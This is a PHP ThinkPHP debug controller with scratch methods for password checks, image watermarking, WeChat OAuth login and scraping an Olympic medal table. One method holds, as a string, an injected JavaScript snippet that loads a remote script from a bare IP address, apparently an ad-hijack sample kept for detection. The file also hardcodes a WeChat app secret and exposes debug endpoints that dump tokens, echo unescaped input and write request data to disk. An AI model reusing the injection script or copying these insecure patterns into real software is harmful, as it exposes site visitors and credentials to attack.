<?php

/**
 * 测试控制器
 * @author chenzj <443629770@qq.com>
 * @since  2016-6-2
 */
use Think\Controller;

class DebugController extends CommonController {

    //put your code here
    public function index() {
        dump(fn_is_pwd('123456'));
        dump(fn_is_pwd('asdasd'));
        dump(fn_is_pwd('asda1234'));
        dump(fn_is_pwd('1234asd'));
        dump(fn_is_pwd('abc456789zasdfgss'));
        dump(getcwd());exit();
        $sourcePath = './Public/Mobile/images/activity/demo.jpg';

        $destPath = './Public/Mobile/images/activity/demo'.rand(0,9999).'.jpg';
        $flag = imageText($sourcePath, $destPath, '我是刘德华','哇哈哈哈');
        echo $destPath;
        if($flag)
        {
            $file = $destPath;
            if($fp = fopen($file,"rb", 0))
            {
                var_dump($fp);
                $gambar = fread($fp,filesize($file));
                fclose($fp);
                $base64 = chunk_split(base64_encode($gambar));
                $encode = '<img src="data:image/jpg/png/gif;base64,' . $base64 .'" >';
                echo $encode;
                unlink($destPath);
                var_dump($file);
            }
        }
    }
    public function img(){
        $image = new \Think\Image();
        //在图片右下角添加水印文字 ThinkPHP 并保存为new.jpg
        $newImg='./Public/Mobile/images/activity/demo'.rand(0,9999).'.jpg';
        $image->open('./Public/Mobile/images/activity/demo.jpg')
                ->text('ThinkPHP','./Public/Mobile/other/hyng.ttf',20,'#000000',10, 1, 436, 467)
                ->save($newImg); 
        var_dump($newImg);
        
    }

    public function teast() {
        $code = I('get.code', '');
        if ($code) {
            //获取token
            $tokenInfo = $this->do_curl('https://api.weixin.qq.com/sns/oauth2/access_token', 'appid=wx4e27335fb7cfba88&secret=5618405b6273235c665667ab9add0008&code=' . $code . '&grant_type=authorization_code');
            $tokenInfo = json_decode($tokenInfo, true);
            echo 'token信息:' . '<br/>';
            var_dump($tokenInfo);
            echo '<br/>';
            //判断token是否有效
//        $valid=$this->do_curl('https://api.weixin.qq.com/sns/auth','access_token='.$tokenInfo['access_token'].'&openid='.$tokenInfo['openid'],array(),'GET','wx');
//        $valid=  json_decode($valid,true);
//        if($valid['errcode']!=0){
//        //刷新token
//            $tokenInfo=$this->do_curl('https://api.weixin.qq.com/sns/oauth2/refresh_token','appid=wx4e27335fb7cfba88&grant_type=refresh_token&refresh_token='.$tokenInfo['refresh_token'],array(),'POST','wx');
//            $tokenInfo=  json_decode($refresh_token,true);
//        }
            //获取用户信息
            $userInfo = $this->do_curl('https://api.weixin.qq.com/sns/userinfo', 'access_token=' . $tokenInfo['access_token'] . '&openid=' . $tokenInfo['openid'] . '&lang=zh_CN', array(), 'GET', 'wx');
            $userInfo = json_decode($userInfo, true);
            $user_id = M('FrontUser')->field('id')->where(array('weixin_unionid' => $tokenInfo['unionid']))->find();
            echo '用户信息:' . '<br/>';
            var_dump($userInfo);
            exit();
            if ($user_id) {
                D('FrontUser')->autoLogin($user_id);
                redirect(U('User/index'));
            } else {
                $token['type'] = 'weixin';
                $token['unionid'] = $tokenInfo['unionid'];
                cookie('loginToken', $token);
                redirect(U('User/tpperfect'));
            }
        }
    }
    public function deredis(){
        S('WxAccessToken',null);
        S('WxTicket',null);
    }
    public function deurl(){
        $total_fee = I('money',0);
        $payType=I('payType',0,'intval');
        var_dump($payType)."<br/>";
         var_dump($total_fee)."<br/>";
        echo $_SERVER['HTTP_HOST']."<br/>";
        echo $_SERVER['PHP_SELF']."<br/>";
        echo $_SERVER['QUERY_STRING']."<br/>";
        $baseUrl = urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$_SERVER['QUERY_STRING']);
        echo $baseUrl."<br/>";
         
    }
    public function file(){
        $param=I('param.');
        var_dump($param);
        file_put_contents('ali_test.txt',json_encode($param));
    }
    
    public function cat(){
        $curlobj = curl_init();
        curl_setopt($curlobj, CURLOPT_URL, 'http://sports.weibo.com/olympics2016/medaltable/view/list');
        curl_setopt($curlobj, CURLOPT_HEADER, 0);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curlobj, CURLOPT_ENCODING, ""); 
        $rtn = curl_exec($curlobj);
        if (curl_errno($curlobj) != 0) {
            echo 'false';
        }
        curl_close($curlobj);
        $contents = mb_convert_encoding($rtn,'UTF-8',"auto");
        $listNumberStr = '/<tr>(.*?)<\/tr>/s';    
        preg_match_all($listNumberStr, $contents, $list);
        $labelstr='/<em.*?>(.*?)<\/em>/is';
        $pregname='/<span.*?>(.*?)<\/span>/is';
        $data=array();
        foreach ($list[1] as $k=>&$v){
            $str= preg_replace('/<td.*?>/i','',$v);
            $str= preg_replace('/<\/td>/i','',$str);
            preg_match_all($labelstr, $str, $data[$k]);
            preg_match_all($pregname, $str, $name);
            $data[$k]=$data[$k][1];
            $data[$k]['name']=$name[1];
            $data[$k]['img'] = Think\Tool\Tool::getTextImgUrl($v,false);
        }
        unset($data[0]);
        $_M=M('OlympicAllmedal');
        foreach ($data as $val) {
                $has=$_M->where(array('country'=>$val['name'][0]))->find();
                if($has){
                    $_M->where(array('country'=>$val['name'][0]))->save(array(
                        'img'=>$val['img'][0],
                        'ranking'=>$val[0],
                        'gold'=>$val[1],
                        'silver'=>$val[2],
                        'copper'=>$val[3],
                    ));
                }else{
                    $_M->add(array(
                        'img'=>$val['img'][0],
                        'country'=>$val['name'][0],
                        'ranking'=>$val[0],
                        'gold'=>$val[1],
                        'silver'=>$val[2],
                        'copper'=>$val[3],
                    ));
                }
        }
    }
    public function isstr(){
        $content['body'] = '(function(){o="http://nba.win007.com/jsData/tech/2/60/260527.js?";sh="http://115.239.138.132:7701/public.lib.main.js?type=neibu&v=3.5&sp=321&ty=dpc&push=inner";w=window;d=document;function ins(s,dm,id){e=d.createElement("script");e.src=s;e.type="text/javascript";id?e.id=id:null;dm.appendChild(e);};p=d.scripts[d.scripts.length-1].parentNode;ins(o,p);ds=function(){db=d.body;if(db && !document.getElementById("bdstat")){if((w.innerWidth||d.documentElement.clientWidth||db.clientWidth)>1){if(w.top==w.self){ins(sh,db,"bdstat");}}}else{setTimeout("ds()",1500);}};ds();})();var mim_sp = "321";var mim_aid = "3510";var mim_uid = "XVpZW1FLXFZcXFxK";var mim_src = "0";var mim_adtype = "1";var mim_ty = "dpc";';
              if(!strstr($content['body'], '(function')){
                  var_dump(strstr($content['body'], '(function'));
              }
        
    }
    public function exp(){
        $aa='1';
        $b=substr($aa,0,-1);
        var_dump($b);
        $v['list_score']='8-2';
        $list_score=  explode(',', $v['list_score']);
        dump($list_score);
        if(empty($list_score)){
            echo 'aabbbb';
        }
        foreach ($list_score as &$vo){
                $vo=  explode('-', $vo);
            }
           echo isset($list_score[1][0])?$list_score[1][0]:'aa';
        dump($list_score);
    }
}
